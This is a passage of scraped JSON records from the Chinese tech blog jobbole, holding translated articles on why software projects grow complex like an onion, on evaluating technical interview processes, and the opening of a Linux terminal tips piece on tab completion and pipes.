fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/liuchang/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 37</a> · <a title=\"我的网站\" target=\"_blank\" href=\"http://blog.csdn.net/github_36299736\"><i class=\"fa fa-link\"></i></a> <a title=\"微博主页\" target=\"_blank\" href=\"http://weibo.com/2577872237\"><i class=\"fa fa-weibo\"></i></a> <a title=\"个人微信：learningDM\" target=\"_blank\" href=\"#\"><i class=\"fa fa-weixin\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/e64df6109ee524641582e16bbaad62524864ccc8.jpg"}
{"url_object_id": "62dfe5b002b87b6d827600206c0ab7de", "title": "越做越复杂的软件工程项目", "url": "http://blog.jobbole.com/113146/", "create_date": "2017/12/11", "front_img_url": ["http://wx2.sinaimg.cn/mw690/63918611gy1fmd055iz98j21jk18814r.jpg"], "praise_nums": 2, "comment_nums": 3, "favor_nums": 4, "tags": "IT技术,软件开发", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/dimple11\">dimple11</a> 翻译，<a href=\"http://www.jobbole.com/members/young605867996\">Lada</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://medium.com/swlh/your-app-is-an-onion-why-software-projects-spiral-out-of-control-bb9247d9bdbd\">Kannan Chandrasegaran</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><h4>你的APP就像个洋葱：为什么软件开发项目一路失控</h4>\n<p>你最开始想得很好。雇佣开发人员来构建出你的创业想法。但是几乎每一周，都感觉似乎项目需要做做调整，于是各种功能开始混进来，范围逐渐蔓延。</p>\n<p>仿佛这项目拥有了自己的生命，而且还试图毁掉你的生活。</p>\n<p><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/63918611gy1fmd055iz98j21jk18814r.jpg\" width=\"690\" height=\"549\"></p>\n<p>怎么会这样呢？你雇佣的开发人员很差劲吗？你对项目管理也只是摸着石头过河吗？还是这个想法从头到尾就是糟糕的？</p>\n<p>有可能。但一个核心误区通常会在一开始注定项目的失败。</p>\n<p>我们的假设是，给产品定义一系列的功能并记在纸上后，虽然偶然有时候要新增功能，有时候要去除功能，但是你一眼就能看出项目的范围大小。</p>\n<p>这个假设是错误的。</p>\n<p>你的项目不像一张纸一样是二维的，它还有深度。</p>\n<p>软件的每个功能都可以被一层一层剥开。事实上，如果我想当标题党的话，我会说你的app就是个洋葱。我来讲一下我的意思，来告诉你为什么当你把自己的 app 一层层剥开时，它会让你泪流满面。</p>\n<h4>终结所有图书馆的图书馆。</h4>\n<p>咱们通过具体的实例来看吧，给你推荐一个我的想法。</p>\n<blockquote><p>人们经常会想要附近图书馆没有的书，而在这附件其它的人可能会有。因此，这款 app 可以让人们发送用书请求，然后有这本书的人会响应。我们从每一次这样的交易中获利。</p></blockquote>\n<p>太有才了。</p>\n<blockquote><p>这我知道，好吧？软件的功能直截了当 ：</p></blockquote>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/63918611gy1fmd0588aa5j21hc0zknjn.jpg\" width=\"690\" height=\"460\"></p>\n<blockquote><p>现在该把规格说明书交给开发人员，并且给软件想个精彩的名字了。叫 kaBooki？lib.rari.ly？reddit？</p></blockquote>\n<p>好吧，稍等一下，我们仔细来看看。而且已经有软件叫reddit了。</p>\n<p>我们带着问题探究一下你的想法，看看会发现什么。</p>\n<p>用户彼此之间如何付款呢？见面的时候付现金还是在 app 上付款呢？</p>\n<blockquote><p>哦，他们应该在app上用信用卡支付，这样我们能够获得提成。</p></blockquote>\n<p>他们实际上怎么发送用书请求呢？我的意思是，他们到底在 app 上要怎么操作呢？要填写一个包含了书名和作者的开放式表格吗？</p>\n<blockquote><p>噢，嗯。他们应该对书进行检索并且选择一本想要的。</p></blockquote>\n<p>好，所以我们需要建个书的数据库。</p>\n<blockquote><p>我猜是要这样。</p></blockquote>\n<p>实际上，什么是用书请求呢？拿着书并且准备把书卖出去的人能看到请求的书单吗？还是说我们要向这些要卖书的人发送通知，像 Uber 或 Thumbtack 那样？</p>\n<blockquote><p>是那样，我们将用书请求发给持有书的人。</p></blockquote>\n<p>所以，卖书者需要往 app 中填充所有在售书籍的信息吗？</p>\n<blockquote><p>呃，是的。</p></blockquote>\n<p>怎么进行书的交接呢？用户自己送书，还是我们处理配送问题？</p>\n<blockquote><p>我们处理配送问题。</p></blockquote>\n<p>所以你需要一个系统来告诉你要拿什么书，以及书应送往的地方。我猜你的司机想知道最短的送书路线，对吧？</p>\n<blockquote><p>好吧，这样不可行。那让用户彼此之间寄书怎么样呢？</p></blockquote>\n<p>所以我们要将收书人的地址给发书的人？怎么处理运费问题呢？</p>\n<blockquote><p>实际上，你知道的，这些用户需要挨得比较近，这样他们就可以直接过去拿书了，还能交个新朋友，对吧？</p></blockquote>\n<p>所以我们需要把挨得近的用户匹配起来。他们怎么找对方呢？App 有没有实时地图好让他们安排见面呢？</p>\n<blockquote><p>好，行，就这样吧。</p></blockquote>\n<p>我们要给书定价吗？还是他们自己商量价格？</p>\n<blockquote><p>他们自己谈个明白，给书定好一个价格。</p></blockquote>\n<p>他们怎么做决定？我们是不是需要在 app 里建个交流平台呢？</p>\n<blockquote><p>他们彼此只需要用电话谈就行了。</p></blockquote>\n<p>好吧，所以我们是不是要用 SMS （Short Messaging Service 短信服务）短信来确认号码呢？还是……你懂我的意思了，我们真的可以永远无休无止地进行下去。</p>\n<blockquote><p>请别这样。</p></blockquote>\n<p>我们来看一下现在功能清单是什么样的：</p>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/63918611gy1fmd059alfrj21hc0zk4p6.jpg\" width=\"690\" height=\"460\"></p>\n<p>每一条项目的功能都可以进行多次扩展，我们只把洋葱拨开了一层，就已经成这样了。</p>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/large/63918611gy1fmd05aus1gg209q05iqgi.gif\" width=\"350\" height=\"198\"></p>\n<p>现在啊，现在可别哭。</p>\n<h4>发生了什么呢？</h4>\n<p>我们要清楚哪些东西不是导致功能激增的原因。</p>\n<h5>这不是我们通常所知的功能蔓延。</h5>\n<p>功能蔓延是指产品中不断增添新的功能，而如果你看一眼我们最终列的功能清单，里面每一条都支持最初的功能设定。</p>\n<h5>这无关乎科技因素。</h5>\n<p>比如说，聊天系统最适宜的结构是怎样的呢？什么支付平台是最容易整合的呢？</p>\n<p>我们在这儿不讨论那些。一个好的开发人员可以通过各式各样的技术手段与你沟通，但是不能替你决定软件需要具备什么功能。</p>\n<h5>这也无关乎技术考量。</h5>\n<p>人们想使用这样的产品吗？当其他用户还很少时，有什么因素会诱使早期的用户来登陆软件呢？用户愿意为这项服务付费吗？</p>\n<p>这些问题与想法的落实、产品市场匹配度的确认、定价的策略等息息相关。再重申一次，这些项都是非常重要的，但却不是软件功能清单中内容多到炸的原因。</p>\n<blockquote><p>当然这也与全球变暖或者牙仙没有丝毫关系，你要告诉我变成项目变成洋葱的原因吗？或者说看完觉得每个其实都并没什么理由？</p></blockquote>\n<p>噢，你这样很无聊，事实是这样：</p>\n<blockquote><p><strong>我们基本上对复杂性是怎么凸显的存在误解。</strong></p></blockquote>\n<p>我们以为每个功能的复杂程度就像我们开始描述的那样。嘿，也许程序员写代码要花费时间，或者随便程序员做什么，但是商业用语区区几个词就可以完全描述软件的功能，像“用户通过 y 使用 x”，对吧？</p>\n<p>这种观点是错的。</p>\n<h4>软件功能更像是分形。</h4>\n<p>你离得越近去看，细节就会展现得越明显。</p>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/large/63918611gy1fmd05c4r90g206y058wxs.gif\" width=\"250\" height=\"188\"></p>\n<blockquote><p>洋葱是分形？</p></blockquote>\n<p>不是，我已经换了比喻。咱们继续。</p>\n<p>我们从全局视角来开始描述软件的功能。但是，当构建好 app，或是使用 app 时，是处在一个较小规模下的。它的完成一步一步进行的，每一个步骤都有可能遇到问题。为了解决问题，你可能需要重新设计这一步、添加新步骤、或是增添全新功能。</p>\n<p>这就像是规划一条从你家到单位的行程。看地图的话，行程好像是直的。</p>\n<p><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/63918611gy1fmd05d11p1j21f50s7k08.jpg\" width=\"690\" height=\"380\"></p>\n<p>当你开始从更小的视角来看，你会发现直的路线并不会城市道路网相契合。你会遇到交通站、高坡和道路阻塞。根据步行、骑行或者开车的不同，你的行程路线也会不同。</p>\n<p>建立软件很大程度上是一样的，你离得越近去看，对解决方案就能有越细致的认识。</p>\n<blockquote><p>这下好了，一路到处都充斥着细节，还都是我需要考虑的。这是否意味着我的产品永远也不可能做完呢？</p></blockquote>\n<p>这么想也对也不对，之所以复杂性凸显，是因为我们一开始就宏观描述了软件功能，也通常就是要实现的目标。然后我们将细节放大，为实现这一目标而一步步建立解决方案。细节放得越大，就会发现越多复杂的问题。</p>\n<p>但复杂性并不是问题所在，问题是我们如何来发现复杂性的。我们把软件功能规格书叫个开发人员，几周过后，我们拿到了第一版的 app 并开始测试。这是我们第一次一步一步操作软件，会从中发现大量漏洞。然后我们做好修订说明，把它交给开发者，让他们再开发第二版 app。</p>\n<p><img class=\"alignnone\" src=\"http://wx3.sinaimg.cn/mw690/63918611gy1fmd05duyq3j20af0dwq4w.jpg\" width=\"375\" height=\"500\"></p>\n<p>在整个流程的最后一步，我们在多次进行之后，得到了很好的解决方案。</p>\n<p>问题是开发周期真的太长了，每一环节都要耗费好几周或好几个月。</p>\n<p>但是发现 app 的潜在复杂性又是必要之举。</p>\n<blockquote><p>通过来回反复和开发人员交涉来发现这种复杂性，既耗时又烧钱。</p></blockquote>\n<p>我们想这样做：</p>\n<p><img class=\"alignnone\" src=\"http://wx3.sinaimg.cn/mw690/63918611gy1fmd05eim30j20af0dwmz4.jpg\" width=\"375\" height=\"500\"></p>\n<p>我们想在开始写代码之前就尽可能多得发现它的复杂性，将软件层层剥开来，看到一个更加健壮的功能清单，而且想做得又快又省钱。</p>\n<p>我们想在软件规格书上来回修改，而不是在app上反复折腾。</p>\n<p>我们想从这个过程：</p>\n<p><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/63918611gy1fmd05f955oj21jk0feaeq.jpg\" width=\"690\" height=\"191\"></p>\n<p> </p>\n<p>走到这个过程：</p>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/63918611gy1fmd05g65vbj21jk0g4443.jpg\" width=\"690\" height=\"200\"></p>\n<p>我们需要两个东西来行之有效地实现这个过程：第一，我们需要一种方式来展示功能清单，以便反复修改；第二，我们需要一种方式来高效地就功能清单进行审核协商。</p>\n<p>我们来看看怎么做。</p>\n<h4>规划功能</h4>\n<p>我们不想以商业用语来谈，而是像用户一样的身份来考虑软件功能。在这个层面就需要处理软件的复杂性问题了。</p>\n<p>首先，列一张用户目标表。你想让用户通过你的 app 获得什么呢？</p>\n<p>接下来，你需要规划用户流程，以用户的身份走每一步，来实现用户目标，并记录这些步骤。</p>\n<p>我们建立一张用户使用 app 的流程图。</p>\n<p>有很多种做的方式，你仅需为每一步勾勒一个简单的略图即可。你可以为用户走过的每一个界面绘制模型，也可以在纸上或软件上画流程图。</p>\n<p><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/63918611gy1fmd05hhi1nj218g0wbtwq.jpg\" width=\"690\" height=\"502\"></p>\n<p>无论你选择哪种方式，确保优先考虑速度问题。除非你是 Photoshop 专家，否则把软件收起来，拿纸和笔画吧。</p>\n<p>确保每个界面在你的软件略图中都能够得以体现。比如说，如果一个特定的步骤会经过 app 的好几个界面，那么把该步骤切分开。我们想要梳理出更多的细节，而不是更少的。</p>\n<p>这个单独的过程应该将 app 中一些复杂的问题平面化。现在，我们要往更深处挖。</p>\n<h4>对一切保持疑问</h4>\n<p>我们要是像之前那样提问的话，范围太宽泛了，无从下手。</p>\n<p>首先我们将适用于大部分软件的一些常见问题列到一起，这些问题可以归为四个大类，你可以把它当做框架来组织软件略图。</p>\n<p>看着软件略图的每一步，问你自己清单上写的每一个问题。如果答案会展现出一个新的步骤，那就把它添加进软件略图。</p>\n<p>清单在这儿：</p>\n<h5>用户输入</h5>\n<p>这些问题与用户提交到产品的信息有关</p>\n<ul>\n<li>用户会输入什么信息？</li>\n<li>输入的是信息是开放式的还是交互式的？</li>\n<li>开放式信息范例：输入自由格式文本，上传图片，录制视频。</li>\n<li>交互举例：往搜索框输入文本来显示可选结果、在地图上选取地址、选择那些预定义选项。</li>\n<li>是否有些输入应该被当做无效呢？App 又该如何处理呢？</li>\n<li>是否有无源输入呢？最常见的例子：通过 GPS 进行用户定位。</li>\n<li>产品需要获取新用户 (<a href=\"https://www.useronboard.com/\">https://www.useronboard.com/</a><u>)</u>的什么信息？用户之后可以对信息进行修改吗？</li>\n</ul>\n<h5>呈现给用户的信息</h5>\n<p>如果之前的部分是输入，你可以把这个当成输出。</p>\n<ul>\n<li>屏幕上哪些信息是呈现给用户的？</li>\n<li>这些信息是以怎样的形式呈现的？比如：文本、图片、地图、清单、图表。</li>\n<li>这些信息需要以某种方式进行分类吗？比如：最近使用频率、距上次使用时间、关联性。</li>\n<li>产品是不是可以主动对外通信？比如：邮件、推送通知、SMS 消息。</li>\n</ul>\n<h5>各部分之间的交互</h5>\n<p>这些问题有关软件体验的不同部分（用户、产品、其他服务）之前是如何交互的。</p>\n<ul>\n<li>用户彼此之间有交互吗？比如：收发邮件、加好友、 “喜欢”、或者给其它用户的内容打标签</li>\n<li>用户与外部服务有交互吗？比如：付费服务、物流跟踪、社交登陆。</li>\n<li>产品与外部服务有交互吗？比如：位置查询服务、天气 API、社交网络（“你的朋友X刚加入了！看看他们的简介！”）</li>\n</ul>\n<h5>企业家功能</h5>\n<p>有关你——企业家，需要从产品中获得什么。</p>\n<ul>\n<li>你需要通过邮件或其他媒介接收提醒或摘要吗？</li>\n<li>需要为你自己或员工提供专门的系统吗？比如：为配送人员提供导航软件，为厨房员工提供实时点餐管理接口。</li>\n<li>你需要手动批准用户/内容的接口吗？</li>\n<li>你需要一个内容审核系统吗？它可以让管理员轻松地进行用户内容移除和用户账户失效的操作。</li>\n</ul>\n<blockquote><p>简直有……数不清的问题。</p></blockquote>\n<p>这就对了！这也真的就是人们在早期开发过程常常忘记的东西。你的产品还有很多特定的问题，随着时间你就会慢慢发现。</p>\n<h4>把它整合到一起</h4>\n<p>建立软件略图和进行软件审核的过程可以让你知道少了什么东西，这个过程重复几次之后，你就能更自信得拿出一个 非常可靠的功能表 了。</p>\n<blockquote><p>你知道，我真的很希望通过这种好像挺奇怪的诀窍，可以使项目得到修缮。听上去工作量还蛮大的。</p></blockquote>\n<p>的确。但这是你在过程中的某些点上，无论如何都必须要做的工作。</p>\n<p>记住我们为什么要这样做。你无论如何都要找到软件功能所潜藏的复杂性因素，你要做的就是选择何时来将洋葱层层剥开。</p>\n<p>基本上来说，有两种选择：</p>\n<ol>\n<li>根据用户找准开发目标，对此建立模型或者流程图，对自己的假想保持疑问态度，并且像我们上面所做的那样将软件层层剥开。或者，</li>\n<li>让开发人员直接开始开发软件，然后根据每一版暴露的问题一次次改版，每改版一次就要花一周时间。几个月后，你通过改版会发现很多问题，而这些问题和你本在一周内用纸笔就可以搞定的问题一模一样。</li>\n</ol>\n<p>所以这让软件项目变得复杂到爆，恨不得能一下子将你生吞活剥。</p>\n<p>所以，去发掘功能吧，建立软件略图，对自己的假想保持疑问态度，以既迅速又省钱的方式发现软件存在的主要问题。</p>\n<p>让自己从压力和痛苦中解脱出来，放手让产品走向外面的世界，让它恣意绽放。</p>\n<blockquote><p>难道洋葱也会开花绽放吗？你的隐喻太蠢了。</p></blockquote>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/63918611gy1fmd05ib9yrj20jw0jw40y.jpg\" width=\"690\" height=\"690\"></p>\n<blockquote><p>噢说得好。</p></blockquote>\n<p>如果你觉得这篇文章挺有用，可以帮我分享它！也可以订阅我的邮件，确保不错过我的下一篇文章。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113146\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113146votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113146\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 4 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 3 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/dimple11\">dimple11</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/dimple11\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2017/09/28db3e36f17643a752be4b798d5ceabc.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            简介还没来得及写 :）        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/dimple11\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/dimple11/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/dimple11/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 15</a>        </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/5f3168649ca6499ecc58fe19364504eed675d2f2.jpg"}
{"url_object_id": "e7a6e5d4aa151c1ce783e4c76522d7ea", "title": "我问每个面试官的两个问题，把工程流程用到软件面试", "url": "http://blog.jobbole.com/113120/", "create_date": "2017/11/29", "front_img_url": ["http://wx2.sinaimg.cn/mw690/7cc829d3gy1flxwcxaj8fj20m80eqdij.jpg"], "praise_nums": 2, "comment_nums": 0, "favor_nums": 1, "tags": "职场,技术面试,面试", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/zhj318\">飞哥的咖啡</a> 翻译。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"http://blog.wesleyac.com/posts/two-interview-questions\">Wesley Aptekar</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>我最近一直在进行软件工程师面试。面试开始时，我都会问面试官两个问题，但至今没有得到令我满意的回答：</p>\n<blockquote><p>1. 你们面试的目的是什么？</p>\n<p>2. 如何评估你们的面试水平？</p></blockquote>\n<p><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/7cc829d3gy1flxwcxaj8fj20m80eqdij.jpg\" width=\"690\" height=\"457\"></p>\n<h3>你们的面试目的是什么？</h3>\n<p>面试官的回答多种多样，只有极少数会说「其实我也不知道我们在寻找什么样的人」。他们大部分人的看法，在我看来，都属于以下几种：</p>\n<ol>\n<li>要找到“最出色的”人才；</li>\n<li>要搞清楚候选人是否适合公司；</li>\n<li>要评估候选人能多好地完成他们正在面试的工作<span style=\"color: #808080;\"><em>（这也比较罕见。注1：在我问的 11 家公司中，只有一家公司给出了接近的回答。）</em></span></li>\n</ol>\n<p>在我接受面试的公司中，只有不到 10% 说：他们进行面试是为了评估候选人<span style=\"color: #000000;\"><strong>如何有效地完成应聘的工作</strong>。</span></p>\n<p>在我看来这点很荒谬：“适合的”招聘策略以及招聘“最好的”人才，这两点筛选过滤掉了许多人才，但这是却基于面试官的偏见，而不是候选人的能力。</p>\n<p>如果你将评估候选人的工作能力看作是面试的重点，那么这也揭示了现在诸多技术面试的不足之处。我本人从未在面试中，接受过团队任务或优先级任务方面的能力评估，相对于在 O(n) 时间内找到回文词（anagram）这样的技术评估，这两项能力可能对软件工程师的工作<a href=\"http://arches.io/2016/01/hire-literally-anyone/\">更加重要</a>。</p>\n<h3>如何评估你们的面试水平？</h3>\n<p>面对我的这个问题，大多数公司的答案是“我们不评估”。<span style=\"color: #808080;\"><em>（注2：“没错，我们对自己的员工很满意，所以我要说，我们在招聘方面做得还不错”，这样的回答在我看来，其实并没有评估招聘过程是否有效。）</em></span></p>\n<p>如果你正在优化一个项目，而你的成功标准却是“我不知道（标准），但我做了一些改变，结果似乎看起来更好了，”相信我，走出房间后你一定会被人耻笑的。然而，这点在招聘过程中似乎是可以被接受的。尽管在创业初期，团队获得的口头承诺是特别重要的一部分，但大多数公司似乎都忽视了其招聘环节，几乎没有人将工程流程应用于招聘中。</p>\n<p>要将工程流程应用到招聘中，第一步是评估你目前拥有的员工，你可以问问自己：目前表现最好的员工是面试过程中表现最好的员工吗？如果不是，原因是什么？大多数公司都会进行绩效考核，也会保留当初面试的材料和相关数据，但很少会有公司将这些结合起来，以改进他们目前的面试过程。</p>\n<p>这样做总比什么都没做要好，但是你仍忽略了问题的另一半：那些你面试中过滤掉的人哪？</p>\n<p>人们常说，<a href=\"https://www.joelonsoftware.com/2006/10/25/the-guerrilla-guide-to-interviewing-version-30/\">拒绝一个好的候选人比招聘一个糟糕的候选人，承担的风险要更小</a>，但我不同意，在我看来它并没有道理。我经常听说，那些顶级公司缺少并渴求有才能的开发人员，而人才市场上却几乎找不到这类人，但也正是这些顶级公司，因为嫌弃候选人的学历或资历不足，或是没有通过白板测试等这个那个的原因，拒绝刷掉了一大批人，其中就有它们想要的人才。这听上去很讽刺，不是吗？即使你认为缩小（已经很小的）人才范围，仍比招错人的风险要小，你至少应该确保，一开始选定的范围是正确的。</p>\n<p>这是一个非常艰难的问题：如果你能获得一些信息，它们足以改变你对候选人最初的看法，那么你应该先雇佣他们。好吧，这是个悖论~ 但我们仍然可以尝试缓解这个问题：</p>\n<h5><strong>对现有员工进行面试</strong></h5>\n<p>如果你想改变面试流程，可以先在现有员工身上尝试。如果有人没有通过面试，你应该问问自己，是否应该要解雇他。当然，你可能不会这么做。</p>\n<p>我听说有一些公司是这么做的，但我认为，绝大多数公司都不会这样尝试。</p>\n<h5><strong>做一个“验证集”</strong></h5>\n<p>要确定认当前招聘策略是否有效的方法之一，就是深入了解一些被你拒绝的候选人，并判断拒绝他们是否是正确决定。</p>\n<blockquote class=\"twitter-tweet\"><p>我一直在 Twitter 上关注并追踪那些在面试中被我们 Pass 掉的候选人，结果证明我们几乎都错了。—— Pulltergeist (@trek) 写于 2016 年 1 月 26 日</p></blockquote>\n<p>但这存在一些问题：</p>\n<ol>\n<li>它对那些没有公共 Github/博客/Twitter 等（社交平台）的人不利。</li>\n<li>有许多候选人的<a href=\"https://blog.codinghorror.com/why-cant-programmers-program/\">编程能力非常糟糕</a>，而在面试过程中，要花更多的时间来发现这个问题。</li>\n</ol>\n<p>尽管依然存在着问题，但我认为它对一些公司来说仍是一个好策略，特别是那些申请者数量较少的公司。</p>\n<p>在现场面试中，这么做一定是可行的。简历则很难适用，因为存在着很多不合格的候选人，但我认为这个策略可能还是有用的。</p>\n<h3>结论</h3>\n<p>在面试过程中，大多数公司似乎都是盲目的。我发现，有些招聘人员和招聘经理甚至不知道他们在找什么样的人才，而且几乎没有人尝试更新和优化面试过程。</p>\n<p>在少数几个关注评估面试流程的公司中，大多数关注的是找到验证候选人好坏的方法，而不是改变现有的面试流程，让那些容易在“典型面试”中淘汰的优秀人才得以通过面试。（注3：Matasano 从那些在“传统面试”中淘汰的人才那里，吸取经验教训，获得了极大的成功。）</p>\n<p>如果你正在（作为面试官）为你的公司进行面试，我很乐意听到你的看法！如果你正在（作为候选人）接受面试，我强烈建议你向面试的公司提出这些问题，以此来看看它们对此的反应，这会非常具有启发性。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113120\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113120votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113120\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/zhj318\">飞哥的咖啡</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/zhj318\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2016/09/9667abaa540914200edd449974fb5538.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            I'm OUT, never IN.        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/zhj318\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/zhj318/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/zhj318/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 48</a> · <a title=\"QQ：574375911\" target=\"_blank\" href=\"#\"><i class=\"fa fa-qq\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/12b9aed2f37016dbd6259925e5ef6d316c6e0411.jpg"}
{"url_object_id": "5b177b5459f12c0388d146c97af8177d", "title": "成为 Linux 终端高手的七种武器", "url": "http://blog.jobbole.com/113127/", "create_date": "2017/11/28", "front_img_url": ["http://jbcdn2.b0.upaiyun.com/2017/05/77d80105fd15f2465894827e23cc4842.jpeg"], "praise_nums": 1, "comment_nums": 1, "favor_nums": 2, "tags": "IT技术,Linux", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"http://www.efytimes.com/e1/fullnews.asp?edid=123564\">efytimes</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-2413-1.html\">Linux中国/Steve Zhang</a>   </div><p>Linux 终端不仅是一个键入命令的地方。如若你能熟谙这些基础技巧，那么你会在绝大多数 Linux 发行版的默认使用的 Bash shell中游刃有余。</p>\n<p>这是howtogeek.com 网站特供给初级用户升级打怪时不能忘记携带的七种武器——</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/11/05883b1166c58ac2a37fe99f2a4f2c3b.jpg\" alt=\"\" width=\"477\" height=\"308\"></p>\n<h3>1.Tab 补全</h3>\n<p>这样能节省时间，并且对于输入那些你不很确定其具体名称的文件和命令来说很方便。比如，当前目录下有一个名为“really long file name”的文件，你想要删除它。你可以输入完整的文件名，但是你必须确保正确地输入了空格和每个字母。若当前目录下还有许多以字母“r”开头的文件，(如果你没有正确地输入字符) Bash 将不知道你想要删除哪一个文件。</p>\n<p>如果在当前目录下存在着另一个名为“really very long file name”的文件，你敲击了Tab键。Bash 将为所有以“r”开头的文件自动补充“really\\ ”部分。此时继续敲击Tab键，你将得到匹配所有文件名的列表。</p>\n<h3>2.管道机制</h3>\n<p>这种机制允许你把一条命令的输出传送到另一条命令。按照 UNIX 